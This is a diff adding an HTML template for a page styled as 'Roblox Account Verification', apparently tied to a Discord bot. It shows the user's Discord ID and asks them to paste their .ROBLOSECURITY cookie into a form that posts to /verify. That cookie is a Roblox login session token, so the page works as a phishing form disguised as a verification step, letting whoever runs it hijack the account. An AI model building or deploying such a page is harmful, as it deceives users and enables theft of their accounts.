@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Roblox Verification</title>
+  <link rel="stylesheet" href="/style.css">
+</head>
+<body>
+  <h1>Roblox Account Verification</h1>
+  <p>Discord ID: <%= discordId %></p>
+  <form method="POST" action="/verify">
+    <input type="hidden" name="discordId" value="<%= discordId %>">
+    <label>.ROBLOSECURITY Cookie:</label>
+    <input type="text" name="roblosecurity" required>
+    <button type="submit">Verify</button>
+  </form>
+</body>
+</html>
